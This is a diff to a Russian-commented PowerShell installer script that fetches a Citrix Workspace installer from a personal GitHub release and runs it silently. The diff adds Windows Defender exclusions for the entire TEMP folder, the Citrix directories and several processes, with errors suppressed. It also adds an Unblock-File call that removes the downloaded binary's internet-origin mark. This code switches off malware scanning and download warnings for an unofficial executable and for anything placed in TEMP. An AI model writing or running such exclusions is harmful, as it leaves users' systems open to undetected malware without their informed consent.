@@ -23,6 +23,12 @@ $DownloadUrl = "https://github.com/Maximka-L/citrix-vdi/releases/download/v1.0/C
 $TargetVersionStr = "2402 LTSR CU1 (24.2.4000.x / 24.2.4001.x)"
 $TempInstallerPath = Join-Path $env:TEMP "CitrixWorkspaceFullInstaller.exe"
 
+# Временное добавление исключений в Защитник Windows (Defender)
+try {
+    Add-MpPreference -ExclusionProcess "CitrixWorkspaceFullInstaller.exe", "TrolleyExpress.exe", "wfica32.exe" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "$env:TEMP", "${env:ProgramFiles(x86)}\Citrix", "${env:ProgramFiles}\Citrix" -ErrorAction SilentlyContinue
+} catch {}
+
 # -------------------------------------------------------------------------
 # ЭТАП 1: УСТАНОВКА СЕРТИФИКАТОВ (Минцифры РФ + Sectigo AAA) И СБРОС КЭШЕЙ
 # -------------------------------------------------------------------------
@@ -256,6 +262,8 @@ if ($needsInstall) {
     Write-Host "   • Single Sign-On : ОТКЛЮЧЕН" -ForegroundColor Gray
     Write-Host "   • Аналитика CEIP : ОТКЛЮЧЕНА" -ForegroundColor Gray
     Write-Host "   Пожалуйста, подождите 1-3 минуты..." -ForegroundColor Gray
+
+    Unblock-File -Path $TempInstallerPath -ErrorAction SilentlyContinue
 
     $args = "/silent /noreboot /forceinstall /includeSSON=false /includeappprotection=false /EnableCEIP=false /AutoUpdateCheck=disabled"
     $instProc = Start-Process -FilePath $TempInstallerPath -ArgumentList $args -PassThru
